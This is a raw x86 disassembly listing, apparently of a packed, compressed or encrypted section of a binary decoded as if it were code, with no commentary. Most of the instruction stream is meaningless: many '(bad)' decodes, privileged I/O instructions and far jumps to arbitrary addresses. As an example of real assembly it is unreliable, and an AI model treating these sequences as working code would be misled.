  41a88d:	xor    eax,0x982d7192
  41a892:	int3   
  41a893:	sbb    DWORD PTR ds:[ecx],0xfffffff7
  41a897:	jae    0x41a8fd
  41a899:	mov    bl,0x19
  41a89b:	icebp  
  41a89c:	sahf   
  41a89d:	xchg   esi,eax
  41a89e:	cmp    edi,DWORD PTR [ebx+0x28299100]
  41a8a4:	jne    0x41a8cd
  41a8a6:	xchg   ebx,eax
  41a8a7:	cs jne 0x41a87f
  41a8aa:	cwde   
  41a8ab:	int    0x8d
  41a8ad:	fnstenv [esi+ebx*8-0x40]
  41a8b1:	push   edx
  41a8b2:	mov    bl,0x51
  41a8b4:	cmp    ebx,DWORD PTR [ecx+0x26820da6]
  41a8ba:	cli    
  41a8bb:	sub    ebp,DWORD PTR [eax-0x223c0ebc]
  41a8c1:	test   eax,0xf698dbcf
  41a8c6:	xchg   esp,eax
  41a8c7:	sbb    al,BYTE PTR [edi+edx*8+0xfa14181]
  41a8ce:	repz jns 0x41a881
  41a8d1:	or     dl,bl
  41a8d3:	sub    al,0x8e
  41a8d5:	sti    
  41a8d6:	dec    ecx
  41a8d7:	daa    
  41a8d8:	loop   0x41a8b8
  41a8da:	into   
  41a8db:	arpl   WORD PTR [ebp-0x7a],ax
  41a8de:	nop
  41a8df:	push   ebp
  41a8e0:	stos   BYTE PTR es:[edi],al
  41a8e1:	xlat   BYTE PTR es:[ebx]
  41a8e3:	mov    bl,0xd5
  41a8e5:	jmp    0xd5059acb
  41a8ea:	(bad)  
  41a8eb:	jmp    0x41a8f6
  41a8ed:	lds    eax,FWORD PTR [edi+edi*4]
  41a8f0:	xchg   edi,eax
  41a8f1:	aam    0x52
  41a8f3:	mov    esp,0xa32756c4
  41a8f8:	in     al,0x80
  41a8fa:	popa   
  41a8fb:	pop    edi
  41a8fc:	or     BYTE PTR [eax],bl
  41a8fe:	or     al,0x34
  41a900:	jmp    0x6e415d60
  41a905:	jmp    0x9e3a:0x2e1b77a
  41a90c:	push   esi
  41a90d:	and    BYTE PTR [ebp-0x55edff14],0x24
  41a914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a915:	mov    al,es:0x26f42652
  41a91b:	jecxz  0x41a977
  41a91d:	aaa    
  41a91e:	ja     0x41a968
  41a920:	pop    ecx
  41a921:	push   es
  41a922:	es dec edi
  41a924:	mov    edx,0x4308b6ed
  41a929:	imul   esi,DWORD PTR [edi+0x40c4c356],0xdc3d4772
  41a933:	scas   eax,DWORD PTR es:[edi]
  41a934:	imul   esp,DWORD PTR [eax],0xffffffde
  41a937:	js     0x41a9a3
  41a939:	sti    
  41a93a:	add    eax,0x4d47d1b6
  41a93f:	sub    DWORD PTR [eax-0x25],esp
  41a942:	pop    edi
  41a943:	aas    
  41a944:	dec    esi
  41a945:	(bad)  
  41a946:	ds call 0x4c86:0x234e4751
  41a94e:	push   0xf42ae1ff
  41a953:	jmp    0x3f869fea
  41a958:	xor    DWORD PTR [ecx+esi*8-0x6],ebp
  41a95c:	call   DWORD PTR [edx-0x1b]
  41a95f:	mov    bh,0x47
  41a961:	and    al,0xe7
  41a963:	fisubr WORD PTR [esi+0x36]
  41a966:	loop   0x41a9cb
  41a968:	fadd   QWORD PTR [eax]
  41a96a:	pusha  
  41a96b:	icebp  
  41a96c:	jne    0x41a916
  41a96e:	mov    ecx,0x5de8c7e4
  41a973:	pop    edi
  41a974:	fs ret 0xf9c6
  41a978:	sbb    BYTE PTR [eax+0x15],al
  41a97b:	mov    bl,0x93
  41a97d:	in     al,dx
  41a97e:	dec    edx
  41a97f:	cmp    ebp,edi
  41a981:	pop    edi
  41a982:	pusha  
  41a983:	xchg   ebp,eax
  41a984:	loop   0x41a9a1
  41a986:	xchg   esp,eax
  41a987:	or     BYTE PTR [edx+0x77],ah
  41a98a:	cs jecxz 0x41a916
  41a98d:	mov    ds:0x6b6fd606,al
  41a992:	popf   
  41a993:	(bad)  
  41a995:	stos   BYTE PTR es:[edi],al
  41a996:	pop    eax
  41a997:	and    dl,BYTE PTR [ebp+0x35]
  41a99a:	add    edi,0x2707e57e
  41a9a0:	jb     0x41a95b
  41a9a2:	scas   eax,DWORD PTR es:[edi]
  41a9a3:	cmp    ch,bh
  41a9a5:	into   
  41a9a6:	dec    esp
  41a9a7:	scas   al,BYTE PTR es:[edi]
  41a9a8:	cmp    ch,bh
  41a9aa:	jg     0x41a99d
  41a9ac:	not    BYTE PTR [ecx+esi*2-0x8]
  41a9b0:	jne    0x41a9d6
  41a9b2:	xor    al,0x97
  41a9b4:	dec    ecx
  41a9b5:	outs   dx,BYTE PTR ds:[esi]
  41a9b6:	mov    eax,0x1c003c4c
  41a9bb:	push   ebx
  41a9bc:	gs jns 0x41aa33
  41a9bf:	cmp    DWORD PTR [esi+edx*1-0x6d],edi
  41a9c3:	xchg   ebp,eax
  41a9c4:	stos   DWORD PTR es:[edi],eax
  41a9c5:	fcmovne st,st(7)
  41a9c7:	jmp    0xddfe:0x8b7e04e3
  41a9ce:	mov    esp,0xb4ff2687
  41a9d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9d4:	cmp    BYTE PTR [esi],al
  41a9d6:	(bad)  
  41a9d8:	dec    BYTE PTR [esi]
  41a9da:	xchg   ebp,eax
  41a9db:	push   esi
  41a9dc:	mov    ecx,0x2462e675
  41a9e1:	mov    ds:0x1c49587d,eax
  41a9e6:	or     al,0xcc
  41a9e8:	bound  ebp,QWORD PTR [esi+0xaf73ee9]
  41a9ee:	imul   ebp,esp,0x5d
  41a9f1:	xor    BYTE PTR [ebx+ecx*1+0x12],ah
  41a9f5:	mov    bl,0xe7
  41a9f7:	mov    ss,WORD PTR [esi+0x2f1d9254]
  41a9fd:	shr    BYTE PTR [edx-0x17c2c787],cl
  41aa03:	jge    0x41aa58
  41aa05:	aam    0x58
  41aa07:	jge    0x41aa4d
  41aa09:	mov    ebx,DWORD PTR [esi]
  41aa0b:	xchg   ebx,ecx
  41aa0d:	cdq    
  41aa0e:	fisub  WORD PTR ds:0x5bc188ee
  41aa14:	imul   ebx,esp,0xc120ee0e
  41aa1a:	inc    esi
  41aa1b:	bound  edx,QWORD PTR [edx]
  41aa1d:	push   edi
  41aa1e:	aas    
  41aa1f:	enter  0x4bd9,0xb4
  41aa23:	sbb    DWORD PTR [edi],ebx
  41aa25:	pop    ds
  41aa26:	out    0x43,eax
  41aa28:	fld    QWORD PTR [esi+0x6f47c2e6]
  41aa2e:	js     0x41a9b3
  41aa30:	push   eax
  41aa31:	ds dec esp
  41aa33:	loope  0x41a9c8
  41aa35:	mov    cl,0xe3
  41aa37:	std    
  41aa38:	dec    edi
  41aa39:	pop    ebp
  41aa3a:	in     al,dx
  41aa3b:	lea    esi,[ebp-0x5ac4aa52]
  41aa41:	or     al,0x6b
  41aa43:	lds    esi,FWORD PTR [esi+0x70]
  41aa46:	xchg   ebx,eax
  41aa47:	jne    0x41aa30
  41aa49:	mov    ecx,0xbfb3fc3e
  41aa4e:	out    dx,eax
  41aa4f:	mov    al,0xe0
  41aa51:	popf   
  41aa52:	or     al,0xd9
  41aa54:	(bad)  [esi+eax*2]
  41aa57:	(bad)  
  41aa58:	into   
  41aa59:	mov    eax,0x10629c99
  41aa5e:	xlat   BYTE PTR ds:[ebx]
  41aa5f:	mov    edi,0xe50b853d
  41aa64:	push   es
  41aa65:	xor    BYTE PTR [edi],ch
  41aa67:	xchg   ebp,eax
  41aa68:	popf   
  41aa69:	jle    0x41aa90
  41aa6b:	cwde   
  41aa6c:	(bad)  
  41aa6d:	outs   dx,BYTE PTR ds:[esi]
  41aa6e:	and    BYTE PTR [esi],bl
  41aa70:	jno    0x41aadb
  41aa72:	sbb    DWORD PTR [edx-0xf],0xe395432b
  41aa79:	mov    bh,0x8a
  41aa7b:	es gs xchg edi,eax
  41aa7e:	mov    eax,ds:0x207a1753
  41aa83:	adc    DWORD PTR [eax+eiz*2-0x40f6ae3a],0xe17c5c22
  41aa8e:	mov    cs,WORD PTR [ecx-0x1f]
  41aa91:	sub    dl,dh
  41aa93:	cs fldl2e 
  41aa96:	jmp    0x62da:0xdb10161
  41aa9d:	jle    0x41aa7b
  41aa9f:	push   edi
  41aaa0:	mov    esp,0xfa855c35
  41aaa5:	add    al,0x56
  41aaa7:	dec    ecx
  41aaa8:	xchg   esp,eax
  41aaa9:	push   esp
  41aaaa:	ja     0x41ab08
  41aaac:	pop    ds
  41aaad:	sbb    esp,edx
  41aaaf:	hlt    
  41aab0:	ins    DWORD PTR es:[edi],dx
  41aab1:	jbe    0x41ab16
  41aab3:	inc    ecx
  41aab4:	rol    esi,cl
  41aab6:	lock xor eax,0x4b8a6e2f
  41aabc:	lea    ebp,[esi+esi*4+0x402f90f1]
  41aac3:	inc    ebp
  41aac4:	fld    TBYTE PTR [ebx+edx*8-0x1f]
  41aac8:	es cmp eax,0x5d360fb4
  41aace:	xor    al,0x37
  41aad0:	fsubr  st(6),st
  41aad2:	mov    bh,0xc1
  41aad4:	pop    ebp
  41aad5:	aam    0xd7
  41aad7:	add    al,0xdd
  41aad9:	test   ebp,ebp
  41aadb:	loope  0x41aaef
  41aadd:	data16 loopne 0x41aae2
  41aae0:	das    
  41aae1:	stc    
  41aae2:	push   edi
  41aae3:	(bad)  
  41aae4:	scas   eax,DWORD PTR es:[edi]
  41aae5:	xor    al,bl
  41aae7:	and    dl,BYTE PTR [ebx+0x6c]
  41aaea:	mov    DWORD PTR [esi-0x31acf4dd],ebx
  41aaf0:	mov    bh,0xac
  41aaf2:	pop    ebx
  41aaf3:	loopne 0x41aa8b
  41aaf5:	stos   BYTE PTR es:[edi],al
  41aaf6:	cmp    DWORD PTR [edi],eax
  41aaf8:	(bad)  
  41aaf9:	icebp  
  41aafa:	fnsave [ebp+ebp*4-0x44]
  41aafe:	push   esp
  41aaff:	in     al,0x69
  41ab01:	xor    BYTE PTR [eax+0x2b0fad25],dh
  41ab07:	mov    ch,0xcf
  41ab09:	jmp    0x41aaf1
  41ab0b:	push   esi
  41ab0c:	(bad)  
  41ab0d:	add    BYTE PTR [ebx*8+0x3b976896],0xa2
  41ab15:	and    ebp,DWORD PTR [edx]
  41ab17:	and    esp,DWORD PTR [ebp+0x53]
  41ab1a:	not    DWORD PTR es:[ecx-0x35]
  41ab1e:	lods   al,BYTE PTR ds:[esi]
  41ab1f:	mov    ebx,0x5dc11a58
  41ab24:	and    eax,DWORD PTR [ebx]
  41ab26:	and    BYTE PTR [ecx],cl
  41ab28:	out    0xa0,al
  41ab2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab2b:	jne    0x41ab55
  41ab2d:	jno    0x41ab93
  41ab2f:	push   cs
  41ab30:	jno    0x41ab5a
  41ab32:	mov    DWORD PTR [edx-0x77],edx
  41ab35:	and    DWORD PTR [esi-0x7a],ebx
  41ab38:	mov    ebx,0x449d2f2e
  41ab3d:	mov    ds:0x3468d203,eax
  41ab42:	mov    esp,0xd85c2a74
  41ab47:	fst    DWORD PTR [ecx+0x62]
  41ab4a:	adc    edi,DWORD PTR [ebp+0xd]
  41ab4d:	out    dx,al
  41ab4e:	jb     0x41ab32
  41ab50:	popa   
  41ab51:	mov    esp,0x735dd7d6
  41ab56:	add    al,BYTE PTR [ecx]
  41ab58:	add    eax,0xc9e4075a
  41ab5d:	pop    ecx
  41ab5e:	mov    eax,ds:0xb0ceb69b
  41ab63:	xor    esp,esi
  41ab65:	sar    BYTE PTR [esi*2-0x3e5a1cd1],cl
  41ab6c:	or     al,0x76
  41ab6e:	pop    ecx
  41ab6f:	xor    ebp,ebp
  41ab71:	les    ebx,FWORD PTR [eax+0x6e]
  41ab74:	(bad)  
  41ab75:	call   0xedda:0xcdd7cf32
  41ab7c:	jle    0x41ab83
  41ab7e:	sar    DWORD PTR [eax+0x6ee096ff],0x93
  41ab85:	push   eax
  41ab86:	add    ebx,esp
  41ab88:	jl     0x41ab55
  41ab8a:	push   es
  41ab8b:	ss leave 
  41ab8d:	cmp    edx,ecx
  41ab8f:	lea    esi,[ecx]
  41ab91:	in     al,0x52
  41ab93:	enter  0xc6d6,0x67
  41ab97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab98:	inc    ebx
  41ab99:	int3   
  41ab9a:	call   0xda9bd412
  41ab9f:	push   0x1b28ea3
  41aba4:	call   eax
  41aba6:	push   edx
  41aba7:	das    
  41aba8:	and    BYTE PTR [esi],ch
  41abaa:	mov    esi,0xfd0459b1
  41abaf:	push   ds
  41abb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abb1:	inc    esi
  41abb2:	jmp    0x41abad
  41abb4:	fistp  QWORD PTR [eax]
  41abb6:	jb     0x41abb5
  41abb8:	out    0xb3,eax
  41abba:	push   ecx
  41abbb:	outs   dx,BYTE PTR ds:[esi]
  41abbc:	sbb    BYTE PTR [eax-0x24],dh
  41abbf:	xor    DWORD PTR [edi+0x4b9b579b],ecx
  41abc5:	or     cl,BYTE PTR [ecx+ebp*2-0x27]
  41abc9:	xchg   ebp,eax
  41abca:	out    dx,al
  41abcb:	stos   BYTE PTR es:[edi],al
  41abcc:	retf   0x1cd1
  41abcf:	sbb    al,BYTE PTR [eax+0x5d7e8693]
  41abd5:	jle    0x41ac51
  41abd7:	push   ds
  41abd8:	jbe    0x41ab66
  41abda:	test   al,0xcd
  41abdc:	test   BYTE PTR [edx],ch
  41abde:	jge    0x41ac57
  41abe0:	and    al,0xc2
  41abe2:	dec    edi
  41abe3:	or     DWORD PTR [ebx],0x1be57a19
  41abe9:	pop    edi
  41abea:	enter  0x34d3,0x3c
  41abee:	sbb    ebp,edx
  41abf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abf1:	sti    
  41abf2:	mov    WORD PTR [eax-0xf],cs
  41abf5:	push   ss
  41abf6:	push   ds
  41abf7:	xlat   BYTE PTR ds:[ebx]
  41abf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abf9:	repz sbb al,0xf0
  41abfc:	push   eax
  41abfd:	or     eax,0xade7d2a6
  41ac02:	cli    
  41ac03:	pop    ds
  41ac04:	(bad)  
  41ac05:	mov    ds:0x4538d4d3,al
  41ac0a:	jmp    0x63af1e27
  41ac0f:	jp     0x41abdd
  41ac11:	ins    BYTE PTR es:[edi],dx
  41ac12:	bound  esi,QWORD PTR [esi-0x1685bb95]
  41ac18:	sbb    esp,DWORD PTR gs:[eax-0x67945e8b]
  41ac1f:	sbb    esi,DWORD PTR [esi-0x31637c89]
  41ac25:	inc    edi
  41ac26:	out    0x60,al
  41ac28:	jmp    0xa5c9:0x76063a96
  41ac2f:	fwait
  41ac30:	ja     0x41ac3a
  41ac32:	lock jbe 0x41abd7
  41ac35:	sbb    al,0x71
  41ac37:	in     eax,0xcf
  41ac39:	popa   
  41ac3a:	repz inc ebx
  41ac3c:	sub    BYTE PTR [edi],bl
  41ac3e:	out    0xf8,eax
  41ac40:	push   cs
  41ac41:	pop    esi
  41ac42:	leave  
  41ac43:	aam    0xb7
  41ac45:	bound  edi,QWORD PTR ds:0x8a6c162b
  41ac4b:	mov    ebx,0xb62c5175
  41ac50:	les    eax,FWORD PTR [ebp+0x2eacbffd]
  41ac56:	test   BYTE PTR [esi+0x280e97b6],cl
  41ac5c:	or     edi,DWORD PTR gs:[esi-0x60]
  41ac60:	scas   al,BYTE PTR es:[edi]
  41ac61:	pop    ebp
  41ac62:	pop    eax
  41ac63:	and    ebp,DWORD PTR [edx+0x16]
  41ac66:	pop    esp
  41ac67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac68:	fcom   DWORD PTR [eax]
  41ac6a:	adc    eax,0xfb1e7d80
  41ac6f:	mov    ch,0x36
  41ac71:	cmp    BYTE PTR [edx+0x489686b7],bh
  41ac77:	mov    ds:0xea4913cc,al
  41ac7c:	popf   
  41ac7d:	push   esp
  41ac7e:	cdq    
  41ac7f:	les    esi,FWORD PTR [esi]
  41ac81:	jo     0x41ac88
  41ac83:	nop
  41ac84:	rol    al,0xec
  41ac87:	xor    ch,bh
  41ac89:	xchg   esp,eax
  41ac8a:	xchg   edx,eax
  41ac8b:	inc    ecx
  41ac8c:	stos   DWORD PTR es:[edi],eax
  41ac8d:	inc    edi
  41ac8e:	hlt    
  41ac8f:	ret    0xe8dc
  41ac92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac93:	dec    esi
  41ac94:	fdiv   QWORD PTR [ebp-0x4804f1ae]
  41ac9a:	int3   
  41ac9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac9c:	and    ebp,DWORD PTR [esi+0x64]
  41ac9f:	mov    cs,WORD PTR [eax+0x5e]
  41aca2:	ret    0xa1ac
  41aca5:	repnz cs mov eax,0xea91bc4e
  41acac:	imul   edi,DWORD PTR [edx],0x5290ff06
  41acb2:	xchg   esp,eax
  41acb3:	inc    eax
  41acb4:	popa   
  41acb5:	dec    edx
  41acb6:	es scas al,BYTE PTR es:[edi]
  41acb8:	loop   0x41ac71
  41acba:	add    al,0x6f
  41acbc:	out    0xdb,al
  41acbe:	dec    edi
  41acbf:	sar    DWORD PTR [eax-0x50],1
  41acc2:	cs out 0xe2,al
  41acc5:	dec    edx
  41acc6:	rcr    DWORD PTR [ebx+0x1b0cca77],1
  41accc:	cli    
  41accd:	addr16 sbb al,0x37
  41acd0:	jno    0x41ac60
  41acd2:	sbb    ebx,DWORD PTR [edx+0x7f487434]
  41acd8:	jl     0x41ac7a
  41acda:	pop    ebp
  41acdb:	and    ebp,DWORD PTR [ebx+0x75]
  41acde:	std    
  41acdf:	das    
  41ace0:	xor    al,0xf5
  41ace2:	test   DWORD PTR [eax+0x2a1738b2],ebx
  41ace8:	repnz fst DWORD PTR [ecx+0x7385f1a3]
  41acef:	cmc    
  41acf0:	xor    bh,BYTE PTR [edi-0x7efbe494]
  41acf6:	fild   DWORD PTR [ebp-0x225b0393]
  41acfc:	int3   
  41acfd:	es push ebx
  41acff:	sbb    esi,DWORD PTR [edi]
  41ad01:	sar    BYTE PTR [edi],1
  41ad03:	push   ds
  41ad04:	sahf   
  41ad05:	stos   BYTE PTR es:[edi],al
  41ad06:	sbb    al,0xdd
  41ad08:	xor    BYTE PTR ds:0x93d72016,0x1
  41ad0f:	or     al,0x98
  41ad11:	aas    
  41ad12:	rol    BYTE PTR [ebx-0x3e],cl
  41ad15:	adc    al,0x76
  41ad17:	pusha  
  41ad18:	dec    esp
  41ad19:	or     edx,DWORD PTR [esi+0x76]
  41ad1c:	ins    BYTE PTR es:[edi],dx
  41ad1d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad1f:	sbb    eax,esi
  41ad21:	sti    
  41ad22:	cwde   
  41ad23:	sbb    eax,0x6a2c518d
  41ad28:	jl     0x41ad86
  41ad2a:	mov    dh,BYTE PTR ds:0xfcf3f6a8
  41ad30:	(bad)
  41ad34:	xchg   DWORD PTR [edx],edi
  41ad36:	int    0xb8
  41ad38:	add    dh,BYTE PTR [edx]
  41ad3a:	mov    cl,bh
  41ad3c:	lods   al,BYTE PTR ds:[esi]
  41ad3d:	sub    ecx,ecx
  41ad3f:	pop    ecx
  41ad40:	add    al,BYTE PTR [ebx+0x12]
  41ad43:	es or  ch,ah
  41ad46:	xor    al,BYTE PTR [edi-0x5]
  41ad49:	jle    0x41adb3
  41ad4b:	jmp    0x41ad23
  41ad4d:	rcr    DWORD PTR [eax+edx*4+0x4323c1ed],cl
  41ad54:	addr16 call 0x68ccf8bb
  41ad5a:	repnz pop es
  41ad5c:	cdq    
  41ad5d:	outs   dx,DWORD PTR ds:[esi]
  41ad5e:	dec    ebx
  41ad5f:	inc    ecx
  41ad60:	and    eax,0x20c2bc6
  41ad65:	xor    BYTE PTR [ebx+0x59c63131],bh
  41ad6b:	fwait
  41ad6c:	addr16 cli 
  41ad6e:	test   BYTE PTR [ebx+0x1222e196],al
  41ad74:	sub    ah,BYTE PTR [edi-0x693e10cd]
  41ad7a:	lods   al,BYTE PTR ds:[esi]
  41ad7b:	and    eax,0xfc8cf790
  41ad80:	std    
  41ad81:	jecxz  0x41ad73
  41ad83:	imul   dh
  41ad85:	shl    BYTE PTR [ebx+ebx*2-0x73e53940],1
  41ad8c:	jp     0x41ad52
  41ad8e:	cwde   
  41ad8f:	and    esi,DWORD PTR [edi+0x56]
  41ad92:	pushf  
  41ad93:	sbb    eax,0x9f4d2c98
  41ad98:	xor    BYTE PTR [esi+0x54f1be7c],bl
  41ad9e:	(bad)  
  41ad9f:	fldcw  WORD PTR [eax-0x1b643ae9]
  41ada5:	out    dx,al
  41ada6:	sahf   
  41ada7:	(bad)  [edx]
  41ada9:	pop    es
  41adaa:	mov    dl,BYTE PTR [esi+0x43a7077a]
  41adb0:	iret   
  41adb1:	mov    DWORD PTR [esi-0x2cf00740],eax
  41adb7:	stc    
  41adb8:	pop    ebx
  41adb9:	lock pushf 
  41adbb:	xchg   ecx,eax
  41adbc:	bound  edi,QWORD PTR [ebx]
  41adbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adbf:	add    eax,0xaca89ba3
  41adc4:	lea    ebp,[ecx]
  41adc6:	les    ebp,FWORD PTR [esi]
  41adc8:	lods   eax,DWORD PTR ds:[esi]
  41adc9:	lea    esp,ds:0x47a907a7
  41adcf:	or     esi,edx
  41add1:	popf   
  41add2:	cmp    eax,edx
  41add4:	aam    0xa
  41add6:	xchg   ebp,eax
  41add7:	sbb    edi,ebx
  41add9:	out    0xb3,al
  41addb:	xor    ah,BYTE PTR [esi+ecx*1+0x46]
  41addf:	lods   eax,DWORD PTR ds:[esi]
  41ade0:	add    BYTE PTR [edx+0x54],bh
  41ade3:	jg     0x41ae2d
  41ade5:	popa   
  41ade6:	je     0x41ada4
  41ade8:	inc    ecx
  41ade9:	dec    DWORD PTR [ebp+0x3c]
  41adec:	mov    al,ds:0xd859964e
  41adf1:	jp     0x41ae56
  41adf3:	mov    DWORD PTR cs:[ebx+esi*8+0x48],edi
  41adf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adf9:	jle    0x41ad9b
  41adfb:	pop    eax
  41adfc:	sub    DWORD PTR [ebp+0x59878b4e],0x61
  41ae03:	jecxz  0x41ada5
  41ae05:	dec    edx
  41ae06:	adc    DWORD PTR [esi-0x79],edx
  41ae09:	jnp    0x41adf2
  41ae0b:	sbb    al,0xe0
  41ae0d:	div    BYTE PTR [esi]
  41ae0f:	loop   0x41adc0
  41ae11:	dec    eax
  41ae12:	xchg   ebx,eax
  41ae13:	data16 and BYTE PTR [edx-0x180ba51a],0xe0
  41ae1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae1c:	int    0xb0
  41ae1e:	(bad)  
  41ae1f:	lods   al,BYTE PTR ds:[esi]
  41ae20:	int3   
  41ae21:	cmc    
  41ae22:	aad    0x60
  41ae24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae25:	jo     0x41adea
  41ae27:	stc    
  41ae28:	jo     0x41adca
  41ae2a:	jno    0x41ae65
  41ae2c:	popa   
  41ae2d:	dec    ecx
  41ae2e:	jns    0x41adfd
  41ae30:	cwde   
  41ae31:	mov    esi,0xdfaf1426
  41ae36:	mov    al,0xdd
  41ae38:	push   cs
  41ae39:	add    al,0x52
  41ae3b:	xchg   ebx,eax
  41ae3c:	add    eax,0xb7c9784f
  41ae41:	pop    es
  41ae42:	arpl   WORD PTR [ebp+0x1],cx
  41ae45:	xacquire xchg BYTE PTR [edx+0x608b3b95],bl
  41ae4c:	mov    ch,0x19
  41ae4e:	xchg   esp,eax
  41ae4f:	(bad)  
  41ae50:	dec    esi
  41ae51:	rcl    DWORD PTR [edx],1
  41ae53:	repz adc al,0x3f
  41ae56:	and    ebx,esi
  41ae58:	loopne 0x41ae74
  41ae5a:	add    eax,edi
  41ae5c:	lods   al,BYTE PTR fs:[esi]
  41ae5e:	std    
  41ae5f:	shl    DWORD PTR [eax],1
  41ae61:	pop    ebx
  41ae62:	inc    edi
  41ae63:	sub    al,0x80
  41ae65:	aam    0x90
  41ae67:	sbb    ah,BYTE PTR [esp+ecx*1-0x663eae5d]
  41ae6e:	div    DWORD PTR [ecx+ebx*2]
  41ae71:	mov    ebx,DWORD PTR [edx-0x63]
  41ae74:	daa    
  41ae75:	sbb    DWORD PTR [ecx-0x57],0xbe3a3ce7
  41ae7c:	lods   al,BYTE PTR ds:[esi]
  41ae7d:	retf   0x1187
  41ae80:	and    BYTE PTR [ecx-0x6c],dh
  41ae83:	fadd   DWORD PTR [ecx+0x73]
  41ae86:	(bad)  
  41ae89:	std    
  41ae8a:	repnz mov WORD PTR [edi+0x7e],ss
  41ae8e:	popa   
  41ae8f:	ffree  st(7)
  41ae91:	or     DWORD PTR [esi-0x7b],0xffffffae
  41ae95:	(bad)  
  41ae97:	xchg   esp,eax
  41ae98:	js     0x41aee5
  41ae9a:	xlat   BYTE PTR ds:[ebx]
  41ae9b:	push   es
  41ae9c:	in     eax,dx
  41ae9d:	mov    dh,0xf5
  41ae9f:	std    
  41aea0:	test   ebx,0x95a28d52
  41aea6:	(bad)  
  41aea9:	sar    BYTE PTR [eax+0x3d],1
  41aeac:	sbb    al,0xc3
  41aeae:	mov    DWORD PTR [esi-0x7b],ebx
  41aeb1:	inc    ebp
  41aeb2:	out    0xd8,al
  41aeb4:	xor    bh,BYTE PTR [edi]
  41aeb6:	xchg   edx,eax
  41aeb7:	xchg   ebx,eax
  41aeb8:	outs   dx,BYTE PTR ds:[esi]
  41aeb9:	xchg   edi,eax
  41aeba:	cmp    dl,BYTE PTR [ebx+ebp*1]
  41aebd:	xchg   ebp,eax
  41aebe:	xchg   ecx,eax
  41aebf:	cmp    BYTE PTR [esi-0x359d01f4],bl
  41aec5:	jg     0x41aea0
  41aec7:	cs data16 mov ah,0xc3
  41aecb:	sahf   
  41aecc:	popf   
  41aecd:	dec    esi
  41aece:	(bad)  
  41aecf:	mov    DWORD PTR [edi+ecx*1],ecx
  41aed2:	pop    ss
  41aed3:	mov    edi,0xa458d223
  41aed8:	cli    
  41aed9:	xchg   ebp,eax
  41aeda:	xchg   DWORD PTR [ebp+0x63],esi
  41aedd:	sub    ch,al
  41aedf:	into   
  41aee0:	cdq    
  41aee1:	repnz mov bh,dh
  41aee4:	mov    edx,0x13ef74dd
  41aee9:	dec    esi
  41aeea:	pop    ss
  41aeeb:	retf   
  41aeec:	in     al,0xd4
  41aeee:	or     ecx,DWORD PTR [esi]
  41aef0:	fwait
  41aef1:	es cwde 
  41aef3:	sbb    esp,DWORD PTR [edx+ecx*1-0x48cc167a]
  41aefa:	jo     0x41aeaa
  41aefc:	push   edx
  41aefd:	cmp    al,0x36
  41aeff:	dec    ebx
  41af00:	call   0xda5b:0xc9ac6f1f
  41af07:	sbb    DWORD PTR es:[esi-0x57],ecx
  41af0b:	jp     0x41ae96
  41af0d:	repnz push edx
  41af0f:	and    DWORD PTR [edi],ebx
  41af11:	mov    bh,BYTE PTR [ecx]
  41af13:	adc    eax,0xc9deee9b
  41af18:	cmp    esi,ecx
  41af1a:	out    dx,al
  41af1b:	ret    
  41af1c:	jg     0x41aef7
  41af1e:	adc    cl,BYTE PTR [ebp+0x2974b3f6]
  41af24:	sahf   
  41af25:	add    bl,BYTE PTR [ebx]
  41af27:	cmp    eax,0xed4f7459
  41af2c:	pop    ds
  41af2d:	sbb    al,0x39
  41af2f:	outs   dx,BYTE PTR ds:[esi]
  41af30:	xchg   ebx,eax
  41af31:	int3   
  41af32:	mov    WORD PTR [ecx+0x62],ds
  41af35:	loop   0x41aef9
  41af37:	mov    bl,0x3b
  41af39:	or     eax,0x8ec1fc7c
  41af3e:	mov    WORD PTR [esi+esi*8-0x1c],ss
  41af42:	jecxz  0x41af07
  41af44:	dec    edi
  41af45:	xchg   esp,eax
  41af46:	ja     0x41afb1
  41af48:	addr16 mov esi,0xc7fda488
  41af4e:	mov    ds,ebp
  41af50:	rol    DWORD PTR [ecx-0x2742bd56],0xb8
  41af57:	(bad)  
  41af59:	xchg   esi,eax
  41af5a:	mov    esi,0x71cff453
  41af5f:	leave  
  41af60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af61:	(bad)  
  41af62:	shr    BYTE PTR [eax],cl
  41af64:	mov    bh,0x29
  41af66:	(bad)  
  41af67:	mov    bl,0xd5
  41af69:	fldcw  WORD PTR [esi]
  41af6b:	add    DWORD PTR [edi-0x4a],ecx
  41af6e:	repz adc esp,DWORD PTR [esi+0x54fb1cb3]
  41af75:	(bad)  
  41af76:	loope  0x41afda
  41af78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af79:	sub    ebx,0xe1ec0b2f
  41af7f:	sub    BYTE PTR [esi-0x6282557f],bh
  41af85:	pusha  
  41af86:	or     eax,0xc2ecdb6d
  41af8b:	stos   DWORD PTR es:[edi],eax
  41af8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af8d:	(bad)  
  41af8e:	loop   0x41afa1
  41af90:	dec    edx
  41af91:	mov    ds:0x8f2c5505,eax
  41af96:	mov    ebp,0x254bd4d7
  41af9b:	rcr    BYTE PTR [esi-0x7a245900],1
  41afa1:	or     al,ah
  41afa3:	(bad)
  41afa7:	push   es
  41afa8:	test   DWORD PTR [ecx+0x4db5a302],ebp
  41afae:	cmp    BYTE PTR [eax+0x44],0x1c
  41afb2:	xchg   ecx,eax
  41afb3:	xchg   esp,eax
  41afb4:	(bad)  
  41afb5:	fsubr  QWORD PTR [edx+0x53]
  41afb8:	or     DWORD PTR [edx],0xef142a4f
  41afbe:	mov    eax,ds:0x26ec56c2
